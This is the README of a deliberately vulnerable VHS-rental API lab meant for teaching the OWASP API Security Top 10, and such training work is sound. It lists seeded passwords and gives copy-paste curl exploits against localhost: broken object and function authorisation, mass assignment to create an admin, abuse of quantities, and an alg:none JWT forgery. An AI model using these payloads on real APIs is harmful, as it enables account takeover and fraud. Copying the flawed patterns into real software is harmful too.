# 📼 FreeTime Video Hire BBS — API Pentest Lab

![docker](https://img.shields.io/badge/docker-compose-blue)
![fastapi](https://img.shields.io/badge/FastAPI-vulnerable--lab-green)
![status](https://img.shields.io/badge/status-vulnerable--by--design-red)

```
  ███████╗██████╗ ███████╗███████╗████████╗██╗███╗   ███╗███████╗
  ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██║████╗ ████║██╔════╝
  █████╗  ██████╔╝█████╗  █████╗     ██║   ██║██╔████╔██║█████╗
  ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝     ██║   ██║██║╚██╔╝██║██╔══╝
  ██║     ██║  ██║███████╗███████╗   ██║   ██║██║ ╚═╝ ██║███████╗
  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝
            V I D E O   H I R E   B B S
              * BE KIND, REWIND *
  [ GUEST ] [ REGISTER ] [ MAILBOX :8025 ] [ CALL NOW :3000 ]
```

A deliberately vulnerable 80s VHS rental storefront, built to teach the
OWASP API Security Top 10 — registration, login, password reset via a
real (sandboxed) mail server, an admin back office, and six intentional
bugs. Everything runs in three tiny containers with one command.

## Prerequisites

Only **Docker** and **Docker Compose** (the `docker compose` v2 plugin).
No Python, no Node, no venv, no manual DB or mail setup.

## Quickstart

```bash
git clone <repo-url> freetime-video-bbs
cd freetime-video-bbs
./start.sh
```

- Storefront: **http://localhost:3000**
- API + Swagger docs: **http://localhost:8000/docs**
- Mail server (catches password reset emails): **http://localhost:8025**
- Healthcheck: **http://localhost:8000/api/health**

Equivalent commands:
```bash
make up      # docker compose up --build
make down    # docker compose down
make clean   # docker compose down -v --rmi local  (wipes DB + images)
```

## Seeded accounts

| username | password      | email                        | role  | balance  |
|----------|---------------|------------------------------|-------|----------|
| admin    | admin123      | admin@email.freetime.video   | admin | $999.99  |
| guest    | guest         | guest@freetime.video         | user  | $5.00    |
| beverly  | vhs4life      | beverly@freetime.video       | user  | $12.50   |
| marty    | 1985delorean  | marty@freetime.video         | user  | $2.00    |
| sarah    | sarah1989     | sarah@freetime.video         | user  | $25.00   |
| videokid | rewind        | kid@freetime.video            | user  | $0.50    |

## Endpoints

| Method | Path                                    | Auth | Notes                         |
|--------|------------------------------------------|------|--------------------------------|
| GET    | /api/health                              | no   | healthcheck                    |
| POST   | /api/v1/auth/register                    | no   | **mass assignment** — VULN 4  |
| POST   | /api/v1/auth/login                       | no   | returns JWT                    |
| POST   | /api/v1/auth/forgot-password             | no   | sends reset link via MailHog   |
| POST   | /api/v1/auth/reset-password              | no   | consumes reset token           |
| GET    | /api/v1/movies                           | no   | `?limit=` unbounded — VULN 3  |
| GET    | /api/v1/movies/{id}                      | no   | movie detail                    |
| GET    | /api/v1/snacks                           | no   | snack bar menu                  |
| GET    | /api/v1/users/{id}                       | yes  | **BOLA** — VULN 1              |
| POST   | /api/v1/rentals                          | yes  | **unrestricted qty** — VULN 5 |
| GET    | /api/v1/rentals                          | yes  | list own rentals                |
| POST   | /api/v1/snacks/purchase                  | yes  | **unrestricted qty** — VULN 5 |
| GET    | /api/v1/admin/users                      | yes* | **BFLA** — VULN 2              |
| POST   | /api/v1/admin/users                      | yes* | **BFLA** — VULN 2              |
| DELETE | /api/v1/admin/users/{id}                 | yes* | **BFLA** — VULN 2              |
| POST   | /api/v1/admin/movies                     | yes* | **BFLA** — VULN 2              |
| POST   | /api/v1/admin/movies/{id}/restock        | yes* | **BFLA** — VULN 2              |
| POST   | /api/v1/admin/snacks/restock             | yes* | **BFLA** — VULN 2              |

`yes*` = should require `is_admin`, but the server never actually checks it.

## Admin page

`admin.html` is the SysOp control panel: a user table (add/delete
accounts, including an `is_admin` checkbox and starting balance field),
a movie stock table (add titles, restock), and a snack stock table
(restock). The frontend hides the page from non-admins, but that's
cosmetic only — see VULN 2 below.

## Six exploits (copy-paste ready)

Log in and grab a guest token:
```bash
TOKEN=$(curl -s -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
```

**1. BOLA — guest reads admin's private profile (user id 1)**
```bash
curl -s http://localhost:8000/api/v1/users/1 -H "Authorization: Bearer $TOKEN"
```

**2. BFLA — guest hits admin-only user list**
```bash
curl -s http://localhost:8000/api/v1/admin/users -H "Authorization: Bearer $TOKEN"
```

**3. BOPLA — dump the whole catalog past the intended page size**
```bash
curl -s "http://localhost:8000/api/v1/movies?limit=9999"
curl -s "http://localhost:8000/api/v1/movies?limit=-1"
```

**4. Mass assignment — register a brand-new admin account with a fat balance**
```bash
curl -s -X POST http://localhost:8000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"hacker@freetime.video","password":"pwned123","is_admin":true,"balance":9999}'
```

**5. Unrestricted resource consumption — negative qty, then absurd qty**
```bash
curl -s -X POST http://localhost:8000/api/v1/rentals \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"movie_id": 1, "qty": -10}'

curl -s -X POST http://localhost:8000/api/v1/rentals \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"movie_id": 1, "qty": 999999}'
```

**6. Forged JWT — `alg: none` token, no signature required**
```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"1","username":"admin","is_admin":true}' | base64 | tr -d '=' | tr '/+' '_-')
FORGED="$HEADER.$PAYLOAD."
curl -s http://localhost:8000/api/v1/admin/users -H "Authorization: Bearer $FORGED"
```

See **LAB-GUIDE.md** for the full walkthrough, flags, and a bonus chain
using registration + forgot-password/MailHog to fully take over the
admin account.

## Troubleshooting

**Port already in use (8000, 3000, 8025, or 1025)**
```bash
lsof -i :8000
```
Edit the matching `ports:` line in `docker-compose.yml` (e.g. `"8001:8000"`) and re-run `./start.sh`.

**Docker permission denied (Linux)**
```bash
sudo usermod -aG docker $USER
# log out and back in, or:
sudo ./start.sh
```

**Stale container / changes not showing up**
```bash
docker compose up --build --force-recreate
```

## Reset the lab to a clean state

```bash
docker compose down -v
./start.sh
```

`down -v` drops the named volume holding the SQLite file, so the next
`start.sh` reseeds the six accounts, 15 movies, and 3 snacks from
scratch.

## ⚠️ Disclaimer

Intentionally vulnerable software. Never deploy on a public network or
reuse its code, secrets, or patterns in a real product. Isolated,
offline educational use only.
